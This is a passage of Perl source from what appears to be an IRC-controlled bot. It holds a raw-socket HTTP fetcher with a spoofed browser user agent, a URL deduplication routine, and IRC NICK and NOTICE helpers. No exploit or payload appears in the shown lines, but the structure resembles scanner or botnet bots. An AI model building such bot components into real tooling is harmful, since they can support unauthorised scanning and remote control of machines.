my $host = $url;
my $query = $url;
my $page = "";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~ s/$host//;
if ( $query eq "" ) { $query = "/"; }
eval {
my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page = "@r";
close($sock);
};
return $page;
}


sub calculate {
my @calculate = ();
my %visti = ();
foreach my $element (@_) {
$element =~ s/\/+/\//g;
next if $visti{$element}++;
push @calculate, $element;
}
return @calculate;
}


sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}


sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}